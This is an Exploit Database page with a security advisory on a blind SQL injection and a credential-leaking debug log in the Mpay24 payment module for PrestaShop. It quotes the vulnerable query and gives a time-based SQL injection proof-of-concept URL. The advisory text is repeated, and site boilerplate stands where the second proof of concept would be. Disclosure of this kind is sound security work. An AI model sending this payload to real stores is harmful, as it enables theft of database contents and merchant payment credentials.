   - ·         Issue status: Patch available

Summary

BAE Systems Applied Intelligence researcher, Eldar Marcussen has identified
two high impact vulnerabilities in the Mpay24 payment module for the
Prestashop e-commerce solution.

“Mpay24 is the online-payment platform for e- and m-commerce combines
frequently used and innovative payment systems in one single interface”. [
www.mpay24.com]

“Prestashop is the free ecommerce solution to start your online business
and start selling online. Build an online store for free with Prestashop.” [
www.prestashop.com]
Pre-Authentication Blind SQL Injection Requires

Mpay24 payment module present on the website.
CVE identifier

CVE-2014-2008
Description

The Mpay24 plugin version 1.5 and earlier does not sufficiently filter or
escape user supplied data used in database queries resulting in SQL
injection vulnerabilities.

The following blind SQL injection vulnerability is caused by user supplied
data being used directly in a database query, as evidenced by the offending
code:

 confirm.php:12:    Db::getInstance()->Execute("

confirm.php:13:            UPDATE `"._DB_PREFIX_."mpay24_order` SET

confirm.php:14:                `MPAYTID` = ".$_REQUEST['MPAYTID'].",

confirm.php:15:                `STATUS` = '".$_REQUEST['STATUS']."'

confirm.php:16:                WHERE `TID` = '".$_REQUEST['TID']."'

confirm.php:17:        ");
Impact

Using this vulnerability, BAE Systems was able to extract information
directly from the database, bypassing any restrictions that may be enforced
by the application.

  Proof of Concept

The following URL introduces an artificial delay in the page response time
which can be used by an attacker to extract data from the database:

http://target/path/modules/mpay24/confirm.php?MPAYTID=1&STATUS=bbb&TID=a%27%20or%20%27a%27%20in%20%28select%20IF%28SUBSTR%28@@version,1,1%29=5,BENCHMARK%281000000,SHA1%280xDEADBEEF%29%29,%20false%29%29;%20--+
Recommendation

Use prepared statements to ensure the structure of the database query
remains intact.
Pre-Authentication Information Disclosure Requires

Mpay24 configured with debug enabled (default value until version 1.6).
CVE identifier

CVE-2014-2009
Description

The Mpay24 plugin logs raw curl requests and other debugging information to
the payment gateway by default. This log file is publicly accessible and
contains information valuable to an attacker, including the base64 encoded
credentials used by the merchant to access the Mpay24 API.
Impact

Using this vulnerability, BAE Systems was able to obtain Mpay24 API
credentials and the local path of the Prestashop installation. The attacker
can use the API credentials to hijack the merchants API access and leverage
the local path disclosure with other exploits.
Proof of Concept

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

   - ·         Issue status: Patch available

Summary

BAE Systems Applied Intelligence researcher, Eldar Marcussen has identified
two high impact vulnerabilities in the Mpay24 payment module for the
Prestashop e-commerce solution.

“Mpay24 is the online-payment platform for e- and m-commerce combines
frequently used and innovative payment systems in one single interface”. [
www.mpay24.com]

“Prestashop is the free ecommerce solution to start your online business
and start selling online. Build an online store for free with Prestashop.” [
www.prestashop.com]
Pre-Authentication Blind SQL Injection Requires

Mpay24 payment module present on the website.
CVE identifier

CVE-2014-2008
Description

The Mpay24 plugin version 1.5 and earlier does not sufficiently filter or
escape user supplied data used in database queries resulting in SQL
injection vulnerabilities.

The following blind SQL injection vulnerability is caused by user supplied
data being used directly in a database query, as evidenced by the offending
code:

 confirm.php:12:    Db::getInstance()->Execute("

confirm.php:13:            UPDATE `"._DB_PREFIX_."mpay24_order` SET

confirm.php:14:                `MPAYTID` = ".$_REQUEST['MPAYTID'].",

confirm.php:15:                `STATUS` = '".$_REQUEST['STATUS']."'

confirm.php:16:                WHERE `TID` = '".$_REQUEST['TID']."'

confirm.php:17:        ");
Impact

Using this vulnerability, BAE Systems was able to extract information
directly from the database, bypassing any restrictions that may be enforced
by the application.

  Proof of Concept

The following URL introduces an artificial delay in the page response time
which can be used by an attacker to extract data from the database:

<http://target/path/modules/mpay24/confirm.php?MPAYTID=1&STATUS=bbb&TID=a%27%20or%20%27a%27%20in%20%28select%20IF%28SUBSTR%28@@version,1,1%29=5,BENCHMARK%281000000,SHA1%280xDEADBEEF%29%29,%20false%29%29;%20--+>
Recommendation

Use prepared statements to ensure the structure of the database query
remains intact.
Pre-Authentication Information Disclosure Requires

Mpay24 configured with debug enabled (default value until version 1.6).
CVE identifier

CVE-2014-2009
Description

The Mpay24 plugin logs raw curl requests and other debugging information to
the payment gateway by default. This log file is publicly accessible and
contains information valuable to an attacker, including the base64 encoded
credentials used by the merchant to access the Mpay24 API.
Impact

Using this vulnerability, BAE Systems was able to obtain Mpay24 API
credentials and the local path of the Prestashop installation. The attacker
can use the API credentials to hijack the merchants API access and leverage
the local path disclosure with other exploits.
